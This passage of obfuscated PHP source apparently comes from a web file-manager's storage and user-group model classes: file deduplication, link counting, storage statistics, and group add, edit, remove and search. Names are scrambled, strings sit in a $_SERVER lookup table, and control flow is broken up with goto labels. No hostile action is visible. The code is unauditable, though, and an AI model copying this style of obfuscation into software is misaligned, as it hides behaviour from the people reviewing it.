&& strlen($A±©£ë²Ù‘[$FàŸªëÆ¦[164]]) > 32) { $A±©£ë²Ù‘[$FàŸªëÆ¦[77]] = intval(substr($A±©£ë²Ù‘[$FàŸªëÆ¦[164]], 32)); } $c»¦îˆ°ÇÂ = $this->add($A±©£ë²Ù‘); return $this->find($c»¦îˆ°ÇÂ); } public function addFile($eÎÜöã°ôÃ, $Cº„èÆĞİ‘, $AõíÇÊ¦† = false) { goto dÈ¥øÔ¥; FÚ²à‚¾Óà: $cŸˆ¡”¨ÑŒ = $_SERVER[´Ù×Íå‘ÄõÛ][2171] . $Dµ«“ŠÕÅ; CacheLock::lock($cŸˆ¡”¨ÑŒ); if ($fõ¯šíëš = $this->addFileCheckExist($f†¯Æ‚ğ‘, $Dµ«“ŠÕÅ, $b ¶¨ï†Ó)) { CacheLock::unlock($cŸˆ¡”¨ÑŒ); return $fõ¯šíëš; } goto f”¾‡Óñ¢‹; D…Öí½ ƒ: return $cÑ¶Î½“½; goto F·°”Ãîì; f”¾‡Óñ¢‹: $a¾¹İ ÃÖ‹ = $this->addFileMake($eÎÜöã°ôÃ, $b ¶¨ï†Ó, $f†¯Æ‚ğ‘, $Dµ«“ŠÕÅ, $Cº„èÆĞİ‘, $AõíÇÊ¦†); $cÑ¶Î½“½ = $this->addFileData($a¾¹İ ÃÖ‹); CacheLock::unlock($cŸˆ¡”¨ÑŒ); goto D…Öí½ ƒ; dÈ¥øÔ¥: $f†¯Æ‚ğ‘ = IO::hashSimple($eÎÜöã°ôÃ); $Dµ«“ŠÕÅ = IO::hashMd5($eÎÜöã°ôÃ); $b ¶¨ï†Ó = IO::size($eÎÜöã°ôÃ); goto FÚ²à‚¾Óà; F·°”Ãîì: } public function addFileMake($Fš£êìñÄÇ, $AŒÕÎ°ÛÙ, $E«‰Üõ…†¹, $dÏçßÖ£‹Ì, $bÖ„ê á²š, $dòÛ„¦Ş§¢) { goto bïäˆºÔÛÒ; bïäˆºÔÛÒ: $BœÈš•°…å =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B¢Ï“éÖ = $this->createFileName($bÖ„ê á²š); $eÅÛŒ®ëºã = get_path_father($B¢Ï“éÖ); goto A÷ƒÓ–˜õª; A÷ƒÓ–˜õª: $e¸©©ÃÚÒ = get_path_this($B¢Ï“éÖ); if ($dòÛ„¦Ş§¢) { $Cé¥òêÔÈ = IO::move($Fš£êìñÄÇ, $eÅÛŒ®ëºã, !1, $e¸©©ÃÚÒ); } else { $Cé¥òêÔÈ = IO::copy($Fš£êìñÄÇ, $eÅÛŒ®ëºã, !1, $e¸©©ÃÚÒ); } if (!$Cé¥òêÔÈ) { return !1; } goto d„‹¤±õ†ã; d„‹¤±õ†ã: $BâóÂ‹æÉæ = KodIO::defaultDriver(); $f„¢â«Ñ¤ë = array($BœÈš•°…å[522] => $AŒÕÎ°ÛÙ, $BœÈš•°…å[2168] => 1, $BœÈš•°…å[386] => $bÖ„ê á²š, $BœÈš•°…å[736] => $BâóÂ‹æÉæ[$BœÈš•°…å[367]], $BœÈš•°…å[387] => $B¢Ï“éÖ, $BœÈš•°…å[2169] => $E«‰Üõ…†¹, $BœÈš•°…å[2170] => $dÏçßÖ£‹Ì); return $f„¢â«Ñ¤ë; goto d¡†½ƒÎÄ; d¡†½ƒÎÄ: } public function addFileCheckExist($dÍŒ­ëŒšÖ, $Aˆ‚Ãä¦ˆÁ, $fË—ƒÛÙ††) { $d»¯ÁæÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bá‘ËÂí = $this->findByHash($dÍŒ­ëŒšÖ, $Aˆ‚Ãä¦ˆÁ); if (!$bá‘ËÂí) { return !1; } $AõíÜ«†Ø‘ = array($d»¯ÁæÓ[2168] => intval($bá‘ËÂí[$d»¯ÁæÓ[2172]]) + 1, $d»¯ÁæÓ[522] => $fË—ƒÛÙ††); $this->where(array($d»¯ÁæÓ[420] => $bá‘ËÂí[$d»¯ÁæÓ[419]]))->save($AõíÜ«†Ø‘); return $bá‘ËÂí; } public function remove($BØìÏ‰·­ª) { $this->linkCountChange($BØìÏ‰·­ª, !1); $this->clearEmpty(); return !0; } public function linkAdd($FŸ¸ğ±¥ïœ) { $this->linkCountChange($FŸ¸ğ±¥ïœ, !0); } public function linkCountChange($cÃÈ´½—ŠÑ, $Ešµó»õ„•) { goto fª±–î‚©Ï; fª±–î‚©Ï: $a…íñ„ğŸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$cÃÈ´½—ŠÑ) { return; } if (!is_array($cÃÈ´½—ŠÑ)) { $cÃÈ´½—ŠÑ = array($cÃÈ´½—ŠÑ); } goto dÊÏ¦Í¼ƒ; dÊÏ¦Í¼ƒ: $fÁ†¥àŸÈ‘ = array(); foreach ($cÃÈ´½—ŠÑ as $e‘ƒ¯öÑø›) { $AçãÏà§‘Ü = $e‘ƒ¯öÑø› . $a…íñ„ğŸ[33]; if (!$fÁ†¥àŸÈ‘[$AçãÏà§‘Ü]) { $fÁ†¥àŸÈ‘[$AçãÏà§‘Ü] = 0; } $fÁ†¥àŸÈ‘[$AçãÏà§‘Ü]++; } $c¹ä¿Ò• Ì = array(); goto dŸèŞÚÆ”; dŸèŞÚÆ”: foreach ($fÁ†¥àŸÈ‘ as $e‘ƒ¯öÑø› => $Eô’‡»öç„) { $AçãÏà§‘Ü = $Eô’‡»öç„ . $a…íñ„ğŸ[33]; if (!$c¹ä¿Ò• Ì[$AçãÏà§‘Ü]) { $c¹ä¿Ò• Ì[$AçãÏà§‘Ü] = array(); } $c¹ä¿Ò• Ì[$AçãÏà§‘Ü][] = $e‘ƒ¯öÑø›; } foreach ($c¹ä¿Ò• Ì as $Eô’‡»öç„ => $a¡‹¥ê¹Ş›) { if (!$a¡‹¥ê¹Ş›) { continue; } $Eô’‡»öç„ = $Ešµó»õ„• ? $Eô’‡»öç„ : -intval($Eô’‡»öç„); $C¹è¸Ãæë’ = array($a…íñ„ğŸ[419] => array($a…íñ„ğŸ[7], $a¡‹¥ê¹Ş›)); if ($Eô’‡»öç„ < 0) { $C¹è¸Ãæë’[$a…íñ„ğŸ[2172]] = array($a…íñ„ğŸ[932], abs($Eô’‡»öç„)); } $this->where($C¹è¸Ãæë’)->setAdd($a…íñ„ğŸ[2172], $Eô’‡»öç„); } goto fÈ×Çª´Ÿ; fÈ×Çª´Ÿ: } public function findByHash($eóÁ‰™„®´, $f®Û‡Ì­ªŸ = false) { $a‹õğ‰ÛÛô =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$eóÁ‰™„®´ && !$f®Û‡Ì­ªŸ) { return !1; } $eÏ¤é¼‡Œ = array($a‹õğ‰ÛÛô[2169] => $eóÁ‰™„®´); if ($f®Û‡Ì­ªŸ) { $eÏ¤é¼‡Œ = array($a‹õğ‰ÛÛô[2170] => $f®Û‡Ì­ªŸ); } return $this->order($a‹õğ‰ÛÛô[2173])->where($eÏ¤é¼‡Œ)->find(); } public function clearEmpty($eõÆÆìùÁŸ = 0) { goto D‰‘Â±Î„Ş; C„‹ëŠª: $AòÙ•É÷ = $this->where($BÑ¸ß¯¦×Á)->select(); if (!$AòÙ•É÷) { return; } $d¸¡—œ¨Ï‡ = new Task($E¶…½ŞÁ‰÷[2175], $E¶…½ŞÁ‰÷[33], count($AòÙ•É÷)); goto dÂÙ‰ñŠ«Ø; dÂÙ‰ñŠ«Ø: foreach ($AòÙ•É÷ as $EÂ›äÂ˜À¾) { $d¸¡—œ¨Ï‡->update(1); $this->resetFile($EÂ›äÂ˜À¾); } $d¸¡—œ¨Ï‡->end(); goto AÔ†¡¤Şò´; D‰‘Â±Î„Ş: $E¶…½ŞÁ‰÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aíìŠë¨ğ = time() - 3600 * 24 * $eõÆÆìùÁŸ; $BÑ¸ß¯¦×Á = $E¶…½ŞÁ‰÷[2174] . $aíìŠë¨ğ; goto C„‹ëŠª; AÔ†¡¤Şò´: } public function resetFile($f¨÷ÇğÙ) { goto eøÙŸ‘¦õ•; B‘õÔÔš·: $B’¢óŠŸ¨Û = Model($fÃÒèÜö[2176])->where($FÀ –ÙèŠ„)->count(); $f‡³‹®ÛØ = intval($dÆ×Š¡¾¡) + intval($B’¢óŠŸ¨Û); if ($f‡³‹®ÛØ == 0) { IO::remove($f¨÷ÇğÙ[$fÃÒèÜö[75]]); $this->where($FÀ –ÙèŠ„)->delete(); $this->metaSet($f¨÷ÇğÙ[$fÃÒèÜö[419]], null, null); return; } goto e½Ÿ¢ŠĞ¯; eøÙŸ‘¦õ•: $fÃÒèÜö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÀ –ÙèŠ„ = array($fÃÒèÜö[420] => $f¨÷ÇğÙ[$fÃÒèÜö[419]]); $dÆ×Š¡¾¡ = Model($fÃÒèÜö[1121])->where($FÀ –ÙèŠ„)->count(); goto B‘õÔÔš·; e½Ÿ¢ŠĞ¯: if ($f¨÷ÇğÙ[$fÃÒèÜö[2172]] != $f‡³‹®ÛØ) { $this->where($FÀ –ÙèŠ„)->save(array($fÃÒèÜö[2168] => $f‡³‹®ÛØ)); } goto eÅéğö›Û; eÅéğö›Û: } public function storageInfo($d¬ˆ™¿ãØì = false) { goto dÚÄŒß÷Ï; dÚÄŒß÷Ï: $CİÄùÒëŠÏ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F­àõ–Äˆ = $this->count() + 0.0; $EŸŠà·È¢ = 0; goto c³Š¤Ää°; BÍ™ÏÈ‚Ü: for ($dšƒœ’‡ = 0; $dšƒœ’‡ < $F­àõ–Äˆ; $dšƒœ’‡ = $dšƒœ’‡ + $d›á²ªÓó¥) { $aÈ‘¯Šõ‰ñ = $this->limit($dšƒœ’‡, $dšƒœ’‡ + $d›á²ªÓó¥)->select(); foreach ($aÈ‘¯Šõ‰ñ as $Eç‡›Å£µ) { $f§ ß¾ÊàÑ += $Eç‡›Å£µ[$CİÄùÒëŠÏ[77]] * $Eç‡›Å£µ[$CİÄùÒëŠÏ[2172]]; $EŸŠà·È¢ += $Eç‡›Å£µ[$CİÄùÒëŠÏ[77]] * ($Eç‡›Å£µ[$CİÄùÒëŠÏ[2172]] - 1); $cö†Û®‚“‚ += $Eç‡›Å£µ[$CİÄùÒëŠÏ[2172]]; } } $còäˆÌŠœµ = array($CİÄùÒëŠÏ[2177] => $f§ ß¾ÊàÑ, $CİÄùÒëŠÏ[2178] => $EŸŠà·È¢, $CİÄùÒëŠÏ[2179] => $EŸŠà·È¢ / $f§ ß¾ÊàÑ, $CİÄùÒëŠÏ[81] => $F­àõ–Äˆ, $CİÄùÒëŠÏ[2180] => $cö†Û®‚“‚); return $còäˆÌŠœµ; goto FŒ´ ’ñ•š; c³Š¤Ää°: $f§ ß¾ÊàÑ = 1; $cö†Û®‚“‚ = 0; $d›á²ªÓó¥ = 5000; goto BÍ™ÏÈ‚Ü; FŒ´ ’ñ•š: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\155\145" => "\147\162\x6f\x75\160\x5f\x6d\145\164\141", "\x6d\145\x74\x61\x46\x69\145\154\x64" => "\x67\162\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($AÍî¡‰áÎ) { $AˆÔØéµ Ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($AˆÔØéµ Ë[2181] => array($AÍî¡‰áÎ[0], $AˆÔØéµ Ë[2182]), $AˆÔØéµ Ë[2183] => array($AÍî¡‰áÎ[0], $AˆÔØéµ Ë[2182])); } protected function getInfo($dÌé©í‘›) { $b ¼Î×›Ë© = $this->getInfoSimple($dÌé©í‘›); if (!$b ¼Î×›Ë©) { return !1; } return $this->_listDataApplyItem($b ¼Î×›Ë©); } protected function getInfoSimple($e¹µ ïˆË, $c“Ê¬¼è•ˆ = false) { $Fì¡íÏ—½” =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($c“Ê¬¼è•ˆ) { $Aµì­â˜˜ = array($Fì¡íÏ—½”[2112] => intval($e¹µ ïˆË)); $D¸İÍ¼¤ëâ = $this->where($Aµì­â˜˜)->find(); return is_array($D¸İÍ¼¤ëâ) ? $D¸İÍ¼¤ëâ : array(); } return $this->cacheFunctionGet($Fì¡íÏ—½”[2184], $e¹µ ïˆË); } protected function groupAdd($eÎØÅ˜¬’) { goto E†´« èœğ; DÜà¯æƒ¬: if ($C–ŠõÙÀÜà[$eĞÒÃ¶÷š [461]]) { $cÍÍ…ğ­’Õ = $C–ŠõÙÀÜà[$eĞÒÃ¶÷š [461]] . $C–ŠõÙÀÜà[$eĞÒÃ¶÷š [2112]] . $eĞÒÃ¶÷š [47]; } $Fİå‘ÇŸÌâ = array($eĞÒÃ¶÷š [386] => $this->groupNameAuto($eÎØÅ˜¬’[$eĞÒÃ¶÷š [463]], $eÎØÅ˜¬’[$eĞÒÃ¶÷š [28]]), $eĞÒÃ¶÷š [368] => $eÎØÅ˜¬’[$eĞÒÃ¶÷š [463]], $eĞÒÃ¶÷š [527] => $cÍÍ…ğ­’Õ, $eĞÒÃ¶÷š [2185] => $eÎØÅ˜¬’[$eĞÒÃ¶÷š [2096]], $eĞÒÃ¶÷š [2186] => 0, $eĞÒÃ¶÷š [2116] => 0); if (isset($eÎØÅ˜¬’[$eĞÒÃ¶÷š [2133]])) { $Fİå‘ÇŸÌâ[$eĞÒÃ¶÷š [2133]] = $eÎØÅ˜¬’[$eĞÒÃ¶÷š [2133]]; } else { $b»öˆ´†¯© = $this->max($eĞÒÃ¶÷š [2133]); if (!$b»öˆ´†¯©) { $b»öˆ´†¯© = 0; } $Fİå‘ÇŸÌâ[$eĞÒÃ¶÷š [2133]] = $b»öˆ´†¯© + 1; } goto A…çÜÍ»…; E†´« èœğ: $eĞÒÃ¶÷š  =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$eÎØÅ˜¬’[$eĞÒÃ¶÷š [463]] && isset($eÎØÅ˜¬’[$eĞÒÃ¶÷š [2112]]) && $eÎØÅ˜¬’[$eĞÒÃ¶÷š [2112]] == 1) { if ($C–ŠõÙÀÜà = $this->getInfoSimple($eÎØÅ˜¬’[$eĞÒÃ¶÷š [2112]], !0)) { return $eÎØÅ˜¬’[$eĞÒÃ¶÷š [2112]]; } } else { $C–ŠõÙÀÜà = $this->getInfoSimple($eÎØÅ˜¬’[$eĞÒÃ¶÷š [463]]); if (!$C–ŠõÙÀÜà) { return !1; } } $cÍÍ…ğ­’Õ = $eĞÒÃ¶÷š [472]; goto DÜà¯æƒ¬; A…çÜÍ»…: if (!empty($eÎØÅ˜¬’[$eĞÒÃ¶÷š [2112]])) { $Fİå‘ÇŸÌâ[$eĞÒÃ¶÷š [2112]] = $eÎØÅ˜¬’[$eĞÒÃ¶÷š [2112]]; } $dïÅ¾é’÷æ = $this->add($Fİå‘ÇŸÌâ); $this->setNamePinyin($dïÅ¾é’÷æ, $Fİå‘ÇŸÌâ[$eĞÒÃ¶÷š [28]]); goto a•‘²±Èğ´; a•‘²±Èğ´: if (isset($eÎØÅ˜¬’[$eĞÒÃ¶÷š [2187]])) { $this->metaSet($dïÅ¾é’÷æ, array($eĞÒÃ¶÷š [2187] => $eÎØÅ˜¬’[$eĞÒÃ¶÷š [2187]], $eĞÒÃ¶÷š [2188] => $eÎØÅ˜¬’[$eĞÒÃ¶÷š [2188]])); unset($eÎØÅ˜¬’[$eĞÒÃ¶÷š [2187]]); unset($eÎØÅ˜¬’[$eĞÒÃ¶÷š [2188]]); } Model($eĞÒÃ¶÷š [1121])->groupRootAdd($dïÅ¾é’÷æ); return $dïÅ¾é’÷æ; goto eë¢ğÙ÷ø´; eë¢ğÙ÷ø´: } protected function groupEdit($f¹±‹ò¼ÒÏ, $F½Å›Ù£) { $fÃˆ£“õŒˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!empty($F½Å›Ù£[$fÃˆ£“õŒˆ[463]])) { $FÅ÷Ìõ‹©° = $this->getInfoSimple($f¹±‹ò¼ÒÏ); $bº·Õœ˜±Ø = $this->getInfoSimple($F½Å›Ù£[$fÃˆ£“õŒˆ[463]]); if (!$FÅ÷Ìõ‹©° || !$bº·Õœ˜±Ø) { return !1; } if ($FÅ÷Ìõ‹©°[$fÃˆ£“õŒˆ[2112]] == $bº·Õœ˜±Ø[$fÃˆ£“õŒˆ[2112]]) { return !1; } if ($F½Å›Ù£[$fÃˆ£“õŒˆ[463]] != $FÅ÷Ìõ‹©°[$fÃˆ£“õŒˆ[463]]) { if ($bº·Õœ˜±Ø[$fÃˆ£“õŒˆ[461]] !== $FÅ÷Ìõ‹©°[$fÃˆ£“õŒˆ[461]] && strpos($bº·Õœ˜±Ø[$fÃˆ£“õŒˆ[461]], $FÅ÷Ìõ‹©°[$fÃˆ£“õŒˆ[461]] . $FÅ÷Ìõ‹©°[$fÃˆ£“õŒˆ[2112]] . $fÃˆ£“õŒˆ[47]) === 0) { return !1; } $F½Å›Ù£[$fÃˆ£“õŒˆ[527]] = $bº·Õœ˜±Ø[$fÃˆ£“õŒˆ[461]] . $F½Å›Ù£[$fÃˆ£“õŒˆ[463]] . $fÃˆ£“õŒˆ[47]; $this->_changeChildLevel($FÅ÷Ìõ‹©°, $bº·Õœ˜±Ø); } } if (isset($F½Å›Ù£[$fÃˆ£“õŒˆ[28]])) { $this->setNamePinyin($f¹±‹ò¼ÒÏ, $F½Å›Ù£[$fÃˆ£“õŒˆ[28]]); } if (isset($F½Å›Ù£[$fÃˆ£“õŒˆ[2187]])) { $this->metaSet($f¹±‹ò¼ÒÏ, array($fÃˆ£“õŒˆ[2187] => $F½Å›Ù£[$fÃˆ£“õŒˆ[2187]], $fÃˆ£“õŒˆ[2188] => $F½Å›Ù£[$fÃˆ£“õŒˆ[2188]])); unset($F½Å›Ù£[$fÃˆ£“õŒˆ[2187]]); unset($F½Å›Ù£[$fÃˆ£“õŒˆ[2188]]); } return $this->where(array($fÃˆ£“õŒˆ[2189] => $f¹±‹ò¼ÒÏ))->save($F½Å›Ù£); } private function _changeChildLevel($bÍ—Š¨›, $FóÌÒ‘Ÿœ, $cÅ™½ºòòØ = false) { goto AÃ¥Æó¿ºš; AÃ¥Æó¿ºš: $B½ÛéÆÃÆ‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dİùù“íĞÅ = $bÍ—Š¨›[$B½ÛéÆÃÆ‘[461]] . $bÍ—Š¨›[$B½ÛéÆÃÆ‘[2112]] . $B½ÛéÆÃÆ‘[47]; $cëŞ†•Òíñ = $FóÌÒ‘Ÿœ[$B½ÛéÆÃÆ‘[461]] . $FóÌÒ‘Ÿœ[$B½ÛéÆÃÆ‘[2112]] . $B½ÛéÆÃÆ‘[47] . $bÍ—Š¨›[$B½ÛéÆÃÆ‘[2112]] . $B½ÛéÆÃÆ‘[47]; goto a¶¦ø—‰Êš; a¶¦ø—‰Êš: if ($cÅ™½ºòòØ) { $cëŞ†•Òíñ = $FóÌÒ‘Ÿœ[$B½ÛéÆÃÆ‘[461]] . $FóÌÒ‘Ÿœ[$B½ÛéÆÃÆ‘[2112]] . $B½ÛéÆÃÆ‘[47]; } $aÉ«²æ¡Öš = array($B½ÛéÆÃÆ‘[527] => array($B½ÛéÆÃÆ‘[485], $bÍ—Š¨›[$B½ÛéÆÃÆ‘[461]] . $bÍ—Š¨›[$B½ÛéÆÃÆ‘[2112]] . $B½ÛéÆÃÆ‘[486])); $d‡­¥—…ã = array($B½ÛéÆÃÆ‘[527] => array($B½ÛéÆÃÆ‘[536], "\162\145\160\x6c\141\x63\x65\50\x70\141\162\x65\x6e\164\x4c\145\x76\x65\x6c\x2c\47{$Dİùù“íĞÅ}\47\54\47{$cëŞ†•Òíñ}\x27\51")); goto BšÔ®Ê¯; BšÔ®Ê¯: $this->where($aÉ«²æ¡Öš)->data($d‡­¥—…ã)->save(); goto Fµ¤ºÂ½Öº; Fµ¤ºÂ½Öº: } public function setNamePinyin($déŒ„ŸĞÑ¡, $dª«ªß‘ = false) { $bØ¥†‹Û‹° =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$dª«ªß‘) { $c²¿µŠÊ‰ = $this->getInfoSimple($déŒ„ŸĞÑ¡); $dª«ªß‘ = $c²¿µŠÊ‰[$bØ¥†‹Û‹°[28]]; } if (!Input::check($dª«ªß‘, $bØ¥†‹Û‹°[530])) { $this->metaSet($déŒ„ŸĞÑ¡, $bØ¥†‹Û‹°[416], null); $this->metaSet($déŒ„ŸĞÑ¡, $bØ¥†‹Û‹°[415], null); return; } $aÌ¯¦ƒñÎ = array($bØ¥†‹Û‹°[416] => str_replace($bØ¥†‹Û‹°[50], $bØ¥†‹Û‹°[33], Pinyin::encode($dª«ªß‘)), $bØ¥†‹Û‹°[415] => Pinyin::encode($dª«ªß‘, $bØ¥†‹Û‹°[531])); $this->metaSet($déŒ„ŸĞÑ¡, $aÌ¯¦ƒñÎ); } protected function groupStatus($dª½‹µ’, $fÅÔî¥ë¾) { goto d›ÚæÅÍ‡Å; d›ÚæÅÍ‡Å: $a—¿ÇÓªÔ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bá’±š±‚ = $this->getInfoSimple($dª½‹µ’); if (!$Bá’±š±‚) { return !1; } goto Bíœ¬›¦ì; Dé¶ÛåâŠ: foreach ($a¨åÒéáÄ as $dª½‹µ’) { $cˆÔšš[] = array($a—¿ÇÓªÔ[2112] => $dª½‹µ’, $a—¿ÇÓªÔ[89] => $a—¿ÇÓªÔ[690], $a—¿ÇÓªÔ[359] => $fÅÔî¥ë¾); } return Model($a—¿ÇÓªÔ[2190])->addAll($cˆÔšš, array(), !0); goto dÖ•¶ÏŞ»ò; Bíœ¬›¦ì: if ($fÅÔî¥ë¾ == $a—¿ÇÓªÔ[83]) { $a¨åÒéáÄ = $this->parentLevelArray($Bá’±š±‚[$a—¿ÇÓªÔ[461]]); } else { $eÈ¶Â‘à = array($a—¿ÇÓªÔ[527] => array($a—¿ÇÓªÔ[485], $Bá’±š±‚[$a—¿ÇÓªÔ[461]] . $Bá’±š±‚[$a—¿ÇÓªÔ[2112]] . $a—¿ÇÓªÔ[486])); $a¨åÒéáÄ = $this->where($eÈ¶Â‘à)->field($a—¿ÇÓªÔ[2112])->select(); $a¨åÒéáÄ = array_to_keyvalue($a¨åÒéáÄ, $a—¿ÇÓªÔ[33], $a—¿ÇÓªÔ[2112]); } $a¨åÒéáÄ[] = $Bá’±š±‚[$a—¿ÇÓªÔ[2112]]; $cˆÔšš = array(); goto Dé¶ÛåâŠ; dÖ•¶ÏŞ»ò: } protected function groupRemove($C¢ßöÊ÷†µ) { goto f¾°ùÉˆ·; f¾°ùÉˆ·: $a×Êâ¹‡á =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f¤øÊßÌ–À = array($a×Êâ¹‡á[2112] => $C¢ßöÊ÷†µ); $d˜Åª©õ = $this->where($f¤øÊßÌ–À)->find(); goto dŒ„ººŒ; CÙ·Ğö˜: Model($a×Êâ¹‡á[753])->groupRootRemove($C¢ßöÊ÷†µ); return $this->where($f¤øÊßÌ–À)->delete(); goto f—á®ø–Ø¤; dŒ„ººŒ: if (!$d˜Åª©õ || $d˜Åª©õ[$a×Êâ¹‡á[463]] == 0) { return !1; } $cÅ‚ó»ì‡ = $this->getInfoSimple($d˜Åª©õ[$a×Êâ¹‡á[463]]); $this->_changeChildLevel($d˜Åª©õ, $cÅ‚ó»ì‡, !0); goto b™ì§×¥§; b™ì§×¥§: $this->where(array($a×Êâ¹‡á[463] => $C¢ßöÊ÷†µ))->save(array($a×Êâ¹‡á[463] => $d˜Åª©õ[$a×Êâ¹‡á[463]])); Model($a×Êâ¹‡á[2190])->where($f¤øÊßÌ–À)->delete(); Model($a×Êâ¹‡á[2191])->where($f¤øÊßÌ–À)->delete(); goto CÙ·Ğö˜; f—á®ø–Ø¤: } protected function groupSort($bÑÄÅ‚º£) { $A­ÀÜ‡Å¨• =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B¯çØ‚¡ùÖ = array(); foreach ($bÑÄÅ‚º£ as $aô£¤°˜ôå => $D‰¥’ÆêİË) { $B¯çØ‚¡ùÖ[] = array($A­ÀÜ‡Å¨•[2112], $D‰¥’ÆêİË, $A­ÀÜ‡Å¨•[2133], $aô£¤°˜ôå + 1); } $this->saveAll($B¯çØ‚¡ùÖ); } public function listData() { $cëæï®„‰™ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cëæï®„‰™[$_SERVER[´Ù×Íå‘ÄõÛ][354]]); return $cëæï®„‰™; } private function _makeOrder($a‰ÀŞÍ«»Ó = '') { goto bäñ•‰Øâ·; bŒ·®¨ÌİÕ: $a‰ÀŞÍ«»Ó = $a‰ÀŞÍ«»Ó . "{$FùÏ§˜æÕõ}\x20{$EªÛÆÏ‚ƒÀ}\x2c\x20\147\x72\x6f\x75\160\x49\104\40\141\x73\x63"; return $this->order($a‰ÀŞÍ«»Ó); goto d›ŞÈ’ÀÄ¬; Eä‚—ã›Õ: $FùÏ§˜æÕõ = Input::get($fÇ¬±Ö’Îà[407], $fÇ¬±Ö’Îà[7], $fÇ¬±Ö’Îà[2116], $dØ¬´ä…²á); $EªÛÆÏ‚ƒÀ = Input::get($fÇ¬±Ö’Îà[408], $fÇ¬±Ö’Îà[7], $fÇ¬±Ö’Îà[2192], array($fÇ¬±Ö’Îà[2192], $fÇ¬±Ö’Îà[404])); $EªÛÆÏ‚ƒÀ = $D‰ŞŸ¿î»[$EªÛÆÏ‚ƒÀ]; goto bŒ·®¨ÌİÕ; bäñ•‰Øâ·: $fÇ¬±Ö’Îà =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dØ¬´ä…²á = array($fÇ¬±Ö’Îà[2112], $fÇ¬±Ö’Îà[28], $fÇ¬±Ö’Îà[2098], $fÇ¬±Ö’Îà[187]); $D‰ŞŸ¿î» = array($fÇ¬±Ö’Îà[402] => $fÇ¬±Ö’Îà[403], $fÇ¬±Ö’Îà[404] => $fÇ¬±Ö’Îà[405]); goto Eä‚—ã›Õ; d›ŞÈ’ÀÄ¬: } public function listChild($D„Æ™ğĞ) { $C†ÊÜÒ©‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C§ØØè‚Æ£ = $this->where(array($C†ÊÜÒ©‰[463] => $D„Æ™ğĞ))->_makeOrder()->selectPage(200); $this->_listDataApply($C§ØØè‚Æ£[$C†ÊÜÒ©‰[354]]); return $C§ØØè‚Æ£; } public function listByID($f©²àÚ–) { $Bãæ´İğ®¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$f©²àÚ–) { return array(); } $a†Œ„×†ìà = array($Bãæ´İğ®¯[2112] => array($Bãæ´İğ®¯[7], $f©²àÚ–)); $bÈä½²ˆî = $this->where($a†Œ„×†ìà)->select(); $this->_listDataApply($bÈä½²ˆî); return $bÈä½²ˆî; } public function listSearch($fÚÍš¸Æöİ) { goto eÉˆÙõ‰; eÉˆÙõ‰: $eÑ—×À ¿Õ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F¯İ¯‹¯Âë = $fÚÍš¸Æöİ[$eÑ—×À ¿Õ[2193]]; $fÀ®³´‹ñÏ = isset($fÚÍš¸Æöİ[$eÑ—×À ¿Õ[2194]]) ? $fÚÍš¸Æöİ[$eÑ—×À ¿Õ[2194]] : !1; goto A½ãÆ•é–´; A½ãÆ•é–´: if (!trim($F¯İ¯‹¯Âë)) { return !1; } $F¯İ¯‹¯Âë = str_replace($eÑ—×À ¿Õ[2195], $eÑ—×À ¿Õ[2196], $F¯İ¯‹¯Âë); $A¨¶«¾ à» = array($eÑ—×À ¿Õ[2112] => array($eÑ—×À ¿Õ[752], "\45{$F¯İ¯‹¯Âë}\45"), $eÑ—×À ¿Õ[28] => array($eÑ—×À ¿Õ[752], "\45{$F¯İ¯‹¯Âë}\x25"), $eÑ—×À ¿Õ[917] => $eÑ—×À ¿Õ[2197]); goto b·ˆÚ ğó; b·ˆÚ ğó: if ($fÀ®³´‹ñÏ) { $bĞááœ„ÛÍ = $this->getInfoSimple($fÀ®³´‹ñÏ); $F‡öáÎŸ÷ = $bĞááœ„ÛÍ[$eÑ—×À ¿Õ[461]] . $fÀ®³´‹ñÏ . $eÑ—×À ¿Õ[486]; $A¨¶«¾ à» = array($A¨¶«¾ à», array($eÑ—×À ¿Õ[461] => array($eÑ—×À ¿Õ[752], $F‡öáÎŸ÷))); } $e«£á¥õ× = $this->_makeOrder()->where($A¨¶«¾ à»)->selectPage(20); $e«£á¥õ× = $e«£á¥õ× ? $e«£á¥õ× : array(); goto cÏ¡ÃáÛÊ; cÏ¡ÃáÛÊ: if (!$e«£á¥õ× || count($e«£á¥õ×[$eÑ—×À ¿Õ[354]]) < 5 && Input::check($F¯İ¯‹¯Âë, $eÑ—×À ¿Õ[306])) { goto eŸ‰ÙÂÎÕ‡; eŸ‰ÙÂÎÕ‡: $EÉ†àÓù·Â = $this->groupChildrenAll($fÀ®³´‹ñÏ); $F„èä…ÁçÀ = $this->_searchFromMeta($eÑ—×À ¿Õ[415], $F¯İ¯‹¯Âë, 10, $EÉ†àÓù·Â); $dë·–…Ÿ÷ = $this->_searchFromMeta($eÑ—×À ¿Õ[416], $F¯İ¯‹¯Âë, 10, $EÉ†àÓù·Â); goto BÍ›÷˜¤”; BÍ›÷˜¤”: $bÏ¶—ÂœØ = array_merge($F„èä…ÁçÀ, $dë·–…Ÿ÷, $e«£á¥õ×[$eÑ—×À ¿Õ[354]]); $e«£á¥õ×[$eÑ—×À ¿Õ[354]] = array_unique_by_key($bÏ¶—ÂœØ, $eÑ—×À ¿Õ[2112]); $e«£á¥õ×[$eÑ—×À ¿Õ[351]][$eÑ—×À 